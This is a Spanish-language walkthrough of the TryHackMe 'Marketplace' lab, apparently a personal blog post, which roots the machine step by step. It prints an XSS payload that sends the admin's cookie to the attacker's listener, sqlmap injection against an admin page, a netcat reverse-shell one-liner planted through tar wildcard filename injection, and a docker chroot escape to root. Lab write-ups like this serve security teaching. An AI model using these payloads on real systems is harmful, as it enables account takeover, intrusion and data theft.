---
title: "Marketplace | TryHackMe"
date: 2023-09-06T02:01:58+05:30
description: "¿Puedes hacerte cargo de la infraestructura de The Marketplace? "
tags: [tryhackme, sqli, docker, web]
---


## Escaneo de puertos

Comencé con el escaneo de `nmap` para encontrar puertos

```bash
$ nmap -sC -sV -Pn 10.10.144.119

22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c8:3c:c5:62:65:eb:7f:5d:92:24:e9:3b:11:b5:23:b9 (RSA)
|   256 06:b7:99:94:0b:09:14:39:e1:7f:bf:c7:5f:99:d3:9f (ECDSA)
|_  256 0a:75:be:a2:60:c6:2b:8a:df:4f:45:71:61:ab:60:b7 (ED25519)
80/tcp    open  http    nginx 1.19.2
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-server-header: nginx/1.19.2
|_http-title: The Marketplace
32768/tcp open  http    Node.js (Express middleware)
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-title: The Marketplace
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```

miramos el sitio web ya que tiene el puerto 80 disponible


{{< figure src="https://i.imgur.com/ipsPYs3.png">}}


En la barra de navegación encontré una página de inicio de sesión, probé algunas cargas útiles de inyección SQL allí pero no funcionaron, también probé sqlmap pero no obtuve resultados, luego fui a la página de registro para registrarme, ahora usando esas credenciales puedo iniciar sesión en el sitio web.

{{< figure src="https://i.imgur.com/0WpwGrs.png">}}

## XSS

En `/New listing` ahora podemos crear un nuevo listado. Como la sala tiene la etiqueta xss, pensé en usar una carga útil xss



{{< figure src="https://i.imgur.com/L1nqpH7.png">}}


`y tenemos un XSS`


## Cookie del administrador

```bash

<script>document.location='http://10.2.55.245:8000/XSS/grabber.php?c='+document.cookie</script>


```

Nos ponemos en escucha por el puerto 8000

```bash
$ nc -nvlp 8000
listening on [any] 1234 ...
connect to [10.2.55.245] from (UNKNOWN) [10.10.144.119] 43900
GET /bogus.php?**output=token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQsInVzZXJuYW1lIjoiY3liZXIiLCJhZG1pbiI6ZmFsc2UsImlhdCI6MTYwMzI1NTc3Mn0.XFgO3ci8vuX_vvcAOeRhducv_RFGgqttCvQuI2FwonE** HTTP/1.1
Host: 10.2.55.245:8000
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Referer: http://10.10.144.119/item/5
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

```


Para asegurarnos de que el administrador vea este listado, le enviaremos un informe mediante la opción "Informar listado a los administradores".

Después de informar, recibiremos la cookie del administrador. 


```bash

$ nc -nvlp 8000
listening on [any] 8000 ...
connect to [10.2.55.245] from (UNKNOWN) [10.10.144.119] 33228
GET /bogus.php?**output=token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MDMyNTc3Nzl9.Tt1_4wFLDydqatc32qabzzgeRiPtoVqPUGwGh6Ittcg** HTTP/1.1
Host: 10.2.55.245:8000
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/85.0.4182.0 Safari/537.36
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Referer: http://localhost:3000/item/5
Accept-Encoding: gzip, deflate
Accept-Language: en-US

```

Ahora editamos en el panel del navegador el token/cookie y tenemos acceso al administrador


al entrar al panel tenemos la primera `flag`

```
THM{c37************************c348d5}
```

## Sql injection

Pulsamos un usuario y accedemos a: /admin?user=1


```
/admin?user='

```

y recibimos un mensaje de error


{{< figure src="https://i.imgur.com/TEAilqy.png">}}


Usamos sqlmap obtener la db

```bash
$ sqlmap --dbms=mysql  -u 'http://10.10.144.119/admin?user=2' -p 'user' --cookie="token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MDMyNTc3Nzl9.Tt1_4wFLDydqatc32qabzzgeRiPtoVqPUGwGh6Ittcg**" --delay=2 --dump  

```

Obtenemos de la tabla messages esto:

```
User Hello!
An automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary password.
Your new password is: @b_ENXkGYUCAv3zJ
,Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace!
,Thank you for your report. We have been unable to review the list

```

Aquí tenemos una posible contraseña SSH `@b_ENXkGYUCAv3zJ`

Probamos con el user jake

```bash
$ ssh jake@10.10.144.119
The authenticity of host '10.10.38.49 (10.10.38.49)' can't be established.
ECDSA key fingerprint is SHA256:nRz0NCvN/WNh5cE3/dccxy42AXrwcJInG2n8nBWtNtg.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.38.49' (ECDSA) to the list of known hosts.
jake@10.10.38.49's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-112-generic x86_64)
```

```bash
jake@the-marketplace:~$ cat user.txt

THM{c3648************************c0b4}

```

### Escalada de privilegios Michael

```bash
jake@the-marketplace:~$ sudo -l
Matching Defaults entries for jake on the-marketplace:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on the-marketplace:
    (michael) NOPASSWD: /opt/backups/backup.sh
```

Jake puede ejecutar /opt/backups/backup.sh como usuario michael

```bash
jake@the-marketplace:~$ cat /opt/backups/backup.sh 
#!/bin/bash
echo "Backing up files...";
tar cf /opt/backups/backup.tar *

```
Y encontré [esta increíble publicación](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/) que explica cómo explotar el comodín en `tar` para escalar privilegios. 


```bash
jake@the-marketplace:~$ cd /opt/backups/
jake@the-marketplace:/opt/backups$ ls
backup.sh  backup.tar
jake@the-marketplace:/opt/backups$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.55.245 1234 >/tmp/f" > shell.sh
jake@the-marketplace:/opt/backups$ echo "" > "--checkpoint-action=exec=sh shell.sh"
jake@the-marketplace:/opt/backups$ echo "" > --checkpoint=1

```

Ejecutamos el script

```bash
jake@the-marketplace:/opt/backups$ sudo -u michael /opt/backups/backup.sh 
Backing up files...
tar: backup.tar: file is the archive; not dumped
rm: cannot remove '/tmp/f': No such file or directory

```

Previamente nos colocamos en escucha en nuestra maquina local

```bash
$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.2.55.245] from (UNKNOWN) [10.10.144.119] 36678
id
uid=1002(michael) gid=1002(michael) groups=1002(michael),999(docker)

```
Estamos en el grupo `Docker`, buscamos en [GTFO Bins](https://gtfobins.github.io/gtfobins/docker/?ref=infosecarticles.com) y somos usuario root

```bash
python -c'import pty;pty.spawn("/bin/bash")'
michael@the-marketplace:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
.
.
.
# cat root.txt
cat root.txt
THM{d17dfe53g9*********}
#


```

